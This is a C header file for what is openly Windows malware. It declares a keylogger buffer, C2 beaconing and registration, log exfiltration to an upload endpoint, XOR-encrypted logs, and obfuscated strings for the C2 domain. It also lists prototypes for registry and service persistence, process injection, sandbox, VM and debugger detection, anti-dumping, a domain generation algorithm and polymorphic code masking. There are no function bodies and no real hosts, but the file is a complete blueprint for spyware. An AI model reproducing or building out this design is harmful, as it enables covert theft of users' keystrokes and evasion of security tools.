#pragma once

// Standard Windows headers
#include <windows.h>
#include <wininet.h>    // Internet functions
#include <stdio.h>      // Standard I/O
#include <wincrypt.h>   // Crypto functions
#include <shlwapi.h>    // Shell light-weight APIs
#include <tlhelp32.h>   // ToolHelp snapshot
#include <psapi.h>      // Process status API
#include <iphlpapi.h>   // IP Helper API

// Core configuration constants
#define BEACON_INTERVAL 5000    // Default C2 beacon interval (ms)
#define EXFIL_INTERVAL 10000    // Log exfiltration interval (ms)
#define MAX_RETRIES 3           // Max exfiltration retries
#define XOR_KEY 0xAC            // Default XOR encryption key
#define LOG_BUFFER_SIZE 4096    // Keylogger buffer size

// Global state variables
extern char CLIENT_ID[64];          // Unique client identifier
extern volatile BOOL running;       // Main loop control flag
extern DWORD sleep_until;           // Sleep expiration timestamp
extern DWORD beacon_interval;       // Current beacon interval
extern char keylogBuffer[LOG_BUFFER_SIZE];  // Keylogger buffer
extern size_t keylogSize;           // Current keylog size
extern char encryptionKey;          // Current keylogger encryption key

// Obfuscated strings (initialised at runtime)
extern char OBF_AGENT[32];      // User agent string
extern char OBF_DOMAIN[16];     // C2 domain
extern char OBF_COMMAND[16];    // Command endpoint
extern char OBF_UPLOAD[16];     // Upload endpoint

// Core functionality prototypes
void StartKeylogger();          // Initialise keylogger
void BeaconToC2(BOOL is_shutdown);  // Contact C2 server
void RegisterWithC2();          // Register client with C2
void ExfiltrateLogs();          // Send collected logs to C2
void HandleCommand(const char* cmd); // Process C2 commands
void XORCrypt(char* data, size_t len, char* key, BOOL shift); // XOR encryption
void GenerateClientID();        // Generate unique client ID
void GetOSInfo(char* os, size_t len);  // Get OS version
void GetArchInfo(char* arch, size_t len); // Get CPU architecture
void InitKeyloggerBuffer();     // Initialise keylogger buffer
void AppendToKeylog(const char* str); // Add to keylog buffer
void EncryptAndRotateLog();     // Encrypt and save logs

// Evasion and persistence prototypes
void InitObfuscatedStrings();   // Initialise obfuscated strings
void InstallPersistence();      // Add registry persistence
void AddSandboxEvasion();       // Perform sandbox checks
void AddAntiAnalysis();         // Check for analysis tools
void AddProcessInjection();     // Inject into other process
void AddAntiDebugging();        // Anti-debugging techniques
void AddAntiDumping();          // Prevent memory dumping
void AddNetworkEvasion();       // Add network jitter

// Debugging and environment checks
BOOL IsDebugged();              // Check for debugger
BOOL IsVM();                    // Check for virtual machine

// Enhanced evasion prototypes
void GenerateDomain(char* domain, size_t max_len); // Domain generation (DGA)
void InstallService();          // Install as Windows service
void ApplyPolymorphicMask();    // Runtime code obfuscation
void ObfuscateCriticalFunctions(); // Memory obfuscation
BOOL IsRealUser();              // Check for user activity

// Helper to decrypt obfuscated strings
char* GetObfString(char* buffer, size_t buf_size, const char* obf_str);